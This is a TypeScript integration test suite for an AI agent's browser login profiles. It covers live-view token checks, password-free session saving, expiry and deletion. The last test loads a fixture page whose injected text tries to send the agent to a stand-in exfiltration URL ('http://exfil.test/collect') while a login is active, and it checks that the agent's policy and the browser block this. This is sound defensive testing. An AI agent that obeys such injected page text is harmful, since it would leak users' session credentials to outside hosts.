import { randomBytes, randomUUID } from "node:crypto"

import type { ModelMessage } from "ai"
import { drizzle } from "drizzle-orm/pglite"
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest"
import WebSocket from "ws"

import { createBrowserService } from "@/browser/index"
import type { LiveOutput } from "@/browser/protocol"
import { setDatabaseForTests, type DB } from "@/db"
import * as schema from "@/db/schema"
import { createBrowserTools } from "@/lib/agent/tools"
import { HttpBrowserProvider } from "@/lib/browser/client"
import { mintLiveToken } from "@/lib/browser/live"
import { finishSignIn, openState, sealState, startSignIn } from "@/lib/browser/profiles"
import { TaskBrowser } from "@/lib/browser/session"

import { asUser, createTestDb, createUser, type TestDb } from "../db/harness"
import { startFixtureSites } from "../fixtures/sites"

// A6 acceptance on the fixture sites (AD-23), with the real kriya-browser:
// the person signs in by take-over over the live view, the login is saved,
// reused by a new task, found expired when the site signs them out, and
// removed; no password or session state lands in logs or the database, and
// the live view refuses wrong tokens before any frame (AT-BRW-12). Also the
// exfiltration case with a login loaded (AS-SEC-02, AT-BRW-08). Needs
// Chromium: KRIYA_TEST_BROWSER=1 (BROWSER_CHROMIUM_PATH picks a local build).

const enabled = process.env.KRIYA_TEST_BROWSER === "1"
const SECRET = "test-secret-".padEnd(48, "y")
const PASSWORD = "Fixture-Pass-7731!"
const noDns = async (): Promise<string[]> => {
  throw Object.assign(new Error("not found"), { code: "ENOTFOUND" })
}

type Execute = (
  input: Record<string, unknown>,
  options: { toolCallId: string; messages: ModelMessage[] }
) => Promise<Record<string, unknown>>
const call = (tool: { execute?: unknown }, input: Record<string, unknown>) =>
  (tool.execute as Execute)(input, { toolCallId: "c1", messages: [] })

type Opened =
  | { status: "open"; ws: WebSocket; messages: LiveOutput[] }
  | { status: number; messages: LiveOutput[] }

// Resolves once the socket opens or the upgrade is refused
function connect(url: string) {
  return new Promise<Opened>((resolve, reject) => {
    const messages: LiveOutput[] = []
    const ws = new WebSocket(url)
    ws.on("message", (raw) => messages.push(JSON.parse(String(raw)) as LiveOutput))
    ws.on("open", () => resolve({ status: "open", ws, messages }))
    ws.on("unexpected-response", (_req, res) => {
      resolve({ status: res.statusCode ?? 0, messages })
      ws.terminate()
    })
    ws.on("error", (error) => {
      if (ws.readyState !== WebSocket.CLOSED) reject(error)
    })
  })
}

async function until(check: () => boolean, ms = 10_000) {
  const start = Date.now()
  while (!check()) {
    if (Date.now() - start > ms) throw new Error("timed out")
    await new Promise((resolve) => setTimeout(resolve, 100))
  }
}

describe.skipIf(!enabled)("login profiles on fixture sites (kriya-browser)", () => {
  let sites: Awaited<ReturnType<typeof startFixtureSites>>
  let service: Awaited<ReturnType<typeof createBrowserService>>
  let provider: HttpBrowserProvider
  let pg: TestDb
  let user: string
  let other: string
  const lines: string[] = []

  const live = (sessionId: string, token: string) =>
    `${service.url.replace("http", "ws")}/live/${sessionId}?token=${encodeURIComponent(token)}`

  // One active task per thread, so each gets its own
  async function task() {
    const thread = `t-${randomUUID().slice(0, 8)}`
    await pg.query(
      "insert into kriya.threads (id, user_id, agent_id) values ($1, $2, 'a1')",
      [thread, user]
    )
    const { rows } = await pg.query<{ id: string }>(
      `insert into kriya.tasks (user_id, thread_id, input, plan_id, tier, deadline_at, step_budget, cost_budget_micro_usd)
       values ($1, $2, '{}', 'free', 'budget', now() + interval '1 hour', 10, 1000) returning id`,
      [user, thread]
    )
    return rows[0].id
  }

  beforeAll(async () => {
    process.env.KRIYA_TOKEN_KEY = randomBytes(32).toString("base64")
    for (const level of ["log", "info", "warn", "error"] as const) {
      const real = console[level].bind(console)
      vi.spyOn(console, level).mockImplementation((...args: unknown[]) => {
        lines.push(args.map(String).join(" "))
        real(...args)
      })
    }
    sites = await startFixtureSites()
    service = await createBrowserService({
      secret: SECRET,
      fixtures: sites.hosts,
      lookup: noDns,
      executablePath: process.env.BROWSER_CHROMIUM_PATH || undefined,
      limits: { idleSeconds: 30, perMinute: 120, perSession: 200 },
    })
    provider = new HttpBrowserProvider(service.url, SECRET)
    pg = await createTestDb()
    setDatabaseForTests(
      drizzle({ client: pg, schema, casing: "snake_case" }) as unknown as DB
    )
    await pg.query(
      "update kriya.plans set browser_minutes = 60, max_login_profiles = 3 where id = 'free'"
    )
    user = await createUser(pg)
    other = await createUser(pg)
    await pg.query(
      "insert into kriya.agents (id, user_id, name, role, glyph) values ('a1', $1, 'Meera', 'r', 'g')",
      [user]
    )
    await pg.query(
      "insert into kriya.threads (id, user_id, agent_id) values ('t1', $1, 'a1')",
      [user]
    )
  }, 60_000)

  afterAll(async () => {
    vi.restoreAllMocks()
    await service?.close()
    await sites?.close()
  })

  it("AT-BRW-12 the live view refuses wrong person, reuse, expiry and wrong session before any frame", async () => {
    const { sessionId } = await provider.open({ taskId: "t", userId: user })
    await provider.act(sessionId, {
      action: "open",
      url: sites.url("profile-editor", "/help"),
    })
    const refused = { status: 401, messages: [] }
    expect(
      await connect(live(sessionId, mintLiveToken(sessionId, other, SECRET)))
    ).toEqual(refused)
    expect(
      await connect(
        live(sessionId, mintLiveToken(sessionId, user, SECRET, Date.now() - 120_000))
      )
    ).toEqual(refused)
    expect(
      await connect(live(randomUUID(), mintLiveToken(sessionId, user, SECRET)))
    ).toEqual(refused)
    expect(
      await connect(live(sessionId, mintLiveToken(sessionId, user, "z".repeat(48))))
    ).toEqual(refused)

    const token = mintLiveToken(sessionId, user, SECRET)
    const ok = await connect(live(sessionId, token))
    if (ok.status !== "open") throw new Error(`refused: ${ok.status}`)
    await until(() => ok.messages.some((m) => m.t === "frame"))
    // Taken by the person: the agent's steps are refused meanwhile
    expect(await provider.act(sessionId, { action: "snapshot" })).toMatchObject({
      ok: false,
      error: "paused",
    })
    // Reused token, and a second viewer
    expect(await connect(live(sessionId, token))).toEqual(refused)
    expect(
      await connect(live(sessionId, mintLiveToken(sessionId, user, SECRET)))
    ).toEqual({ status: 409, messages: [] })
    // Done gives control back
    ok.ws.send(JSON.stringify({ t: "done" }))
    await until(() => ok.messages.some((m) => m.t === "ended"))
    expect((await provider.act(sessionId, { action: "snapshot" })).ok).toBe(true)
    await provider.close(sessionId)
  }, 60_000)

  // A6 exit item: keystroke → next frame, on this machine (loopback, local
  // Chrome). Not a phone-network figure; that waits for staging (AB-08).
  it("live-view latency, measured locally", async () => {
    const { sessionId } = await provider.open({ taskId: "t", userId: user })
    await provider.act(sessionId, {
      action: "open",
      url: sites.url("profile-editor", "/intro"),
    })
    const ok = await connect(live(sessionId, mintLiveToken(sessionId, user, SECRET)))
    if (ok.status !== "open") throw new Error(`refused: ${ok.status}`)
    const frames = () => ok.messages.filter((m) => m.t === "frame").length
    await until(() => frames() > 0)
    ok.ws.send(JSON.stringify({ t: "key", key: "Tab" }))
    await new Promise((resolve) => setTimeout(resolve, 500))
    const samples: number[] = []
    for (let i = 0; i < 15; i++) {
      const seen = frames()
      const start = performance.now()
      ok.ws.send(JSON.stringify({ t: "text", text: "a" }))
      await until(() => frames() > seen, 5_000)
      samples.push(performance.now() - start)
      await new Promise((resolve) => setTimeout(resolve, 150))
    }
    samples.sort((a, b) => a - b)
    const median = samples[Math.floor(samples.length / 2)]
    const p95 = samples[Math.ceil(samples.length * 0.95) - 1]
    console.info(
      `live view latency (local, n=${samples.length}): median ${median.toFixed(0)} ms, p95 ${p95.toFixed(0)} ms, max ${samples.at(-1)!.toFixed(0)} ms`
    )
    expect(median).toBeLessThan(1_000)
    ok.ws.close()
    await provider.close(sessionId)
  }, 60_000)

  let profileId = ""

  it("sign-in by take-over: the person types, Kriya saves the session and never the password", async () => {
    const started = await startSignIn(provider, user, {
      url: sites.url("profile-editor", "/login"),
      label: "Work",
    })
    profileId = started.profileId
    const opened = await connect(
      live(started.sessionId, mintLiveToken(started.sessionId, user, SECRET))
    )
    if (opened.status !== "open") throw new Error(`refused: ${opened.status}`)
    await until(() => opened.messages.some((m) => m.t === "frame"))
    const type = (input: object) => opened.ws.send(JSON.stringify(input))
    // Email, then password, then submit: typed by the person, not the agent
    type({ t: "key", key: "Tab" })
    type({ t: "text", text: "person@fixture.test" })
    type({ t: "key", key: "Tab" })
    type({ t: "text", text: PASSWORD })
    type({ t: "key", key: "Enter" })
    await until(() =>
      opened.messages.some((m) => m.t === "page" && m.url.endsWith("/account"))
    )
    expect(await finishSignIn(provider, user, profileId, { save: true })).toBe("saved")

    const { rows } = await pg.query<{ state_sealed: string; status: string }>(
      "select state_sealed, status from kriya.login_profiles where id = $1",
      [profileId]
    )
    expect(rows[0].status).toBe("active")
    const state = openState(user, profileId, rows[0].state_sealed)
    expect(state.cookies.map((c) => [c.name, c.domain, c.httpOnly])).toEqual([
      ["session", "profile-editor.fixture.test", true],
    ])
    expect(rows[0].state_sealed).not.toContain(state.cookies[0].value)
    // Zero password anywhere: state, every kriya table, every log line
    expect(JSON.stringify(state)).not.toContain(PASSWORD)
    const { rows: tables } = await pg.query<{ table_name: string }>(
      "select table_name from information_schema.tables where table_schema = 'kriya' and table_type = 'BASE TABLE'"
    )
    for (const { table_name } of tables) {
      const { rows: hits } = await pg.query(
        `select 1 from kriya.${table_name} t where t::text like $1 limit 1`,
        [`%${PASSWORD}%`]
      )
      expect(hits, table_name).toEqual([])
    }
    expect(lines.join("\n")).not.toContain(PASSWORD)
    expect(lines.join("\n")).not.toContain(state.cookies[0].value)
  }, 60_000)

  it("a new task reuses the login on its site, then finds it expired when the site signs out", async () => {
    const browser = new TaskBrowser(
      provider,
      { id: await task(), userId: user },
      { profiles: true }
    )
    const signedIn = await browser.act({
      action: "open",
      url: sites.url("profile-editor", "/account"),
    })
    expect(signedIn.ok && signedIn.snapshot.text).toContain("Signed in as Fixture Person")
    await browser.close()

    sites.revokeSessions()
    const later = new TaskBrowser(
      provider,
      { id: await task(), userId: user },
      { profiles: true }
    )
    const result = await later.act({
      action: "open",
      url: sites.url("profile-editor", "/account"),
    })
    expect(result).toMatchObject({ ok: false, error: "login_required" })
    // The password field's value is never read into the snapshot
    expect(JSON.stringify(result)).not.toContain(PASSWORD)
    await later.close()
    const { rows } = await pg.query(
      "select status, state_sealed from kriya.login_profiles where id = $1",
      [profileId]
    )
    expect(rows).toEqual([{ status: "expired", state_sealed: null }])
  }, 60_000)

  it("removing the login deletes it for good", async () => {
    await asUser(pg, user, (tx) =>
      tx.query("delete from kriya.login_profiles where id = $1", [profileId])
    )
    const { rows } = await pg.query("select 1 from kriya.login_profiles where id = $1", [
      profileId,
    ])
    expect(rows).toEqual([])
  })

  it("AS-SEC-02 / AT-BRW-08 with a login loaded, injected text can't take the session to another site", async () => {
    const { rows } = await pg.query<{ id: string }>(
      "insert into kriya.login_profiles (user_id, domain, label) values ($1, 'fixture.test', 'Mail') returning id",
      [user]
    )
    const id = rows[0].id
    const state = {
      cookies: [
        {
          name: "mail",
          value: "fixture-mail-session",
          domain: "injection.fixture.test",
          path: "/",
          expires: -1,
          httpOnly: true,
          secure: false,
          sameSite: "Lax" as const,
        },
      ],
      origins: [],
    }
    await pg.query(
      "update kriya.login_profiles set status = 'active', state_sealed = $2, confirmed_at = now(), expires_at = now() + interval '90 days' where id = $1",
      [id, sealState(user, id, state)]
    )
    const before = sites.requests.length
    const browser = new TaskBrowser(
      provider,
      { id: await task(), userId: user },
      { profiles: true }
    )
    const tools = createBrowserTools(browser)
    const page = await call(tools.browser_open, {
      url: sites.url("injection", "/signed-in"),
    })
    expect(page).toMatchObject({ done: true })
    // What the injected text asks for: refused by policy (R3)…
    expect(
      await call(tools.browser_open, { url: "http://exfil.test/collect" })
    ).toMatchObject({ done: false, class: "R3" })
    // …and a plain link out is stopped by kriya-browser itself
    const ref = /(e\d+) link "Read more"/.exec(String(page.page))?.[1]
    expect(ref).toBeTruthy()
    await call(tools.browser_click, { ref })
    expect(browser.view.facts.url).toBe(sites.url("injection", "/signed-in"))
    await browser.close()
    expect(
      sites.requests.slice(before).filter((r) => r.startsWith("exfil.test"))
    ).toEqual([])

    // Control: without a login the same link does leave, so the guard above
    // is what stopped it, not the egress proxy
    const plain = new TaskBrowser(provider, { id: await task(), userId: user })
    const free = createBrowserTools(plain)
    const again = await call(free.browser_open, {
      url: sites.url("injection", "/signed-in"),
    })
    const link = /(e\d+) link "Read more"/.exec(String(again.page))?.[1]
    await call(free.browser_click, { ref: link })
    expect(plain.view.facts.url).toBe("http://exfil.test/collect")
    await plain.close()
  }, 60_000)
})
